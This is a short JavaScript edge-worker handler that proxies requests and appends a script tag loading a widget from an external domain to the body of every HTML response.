export default {
  async fetch(request) {
    const res = await fetch(request);
    const type = res.headers.get("content-type") || "";
    if (!type.includes("text/html")) return res;
    return new HTMLRewriter()
      .on("body", {
        element(el) {
          el.append(
            '<script src="https://workbench.novaisystems.online/widget.js"></script>',
            { html: true }
          );
        }
      })
      .transform(res);
  }
};
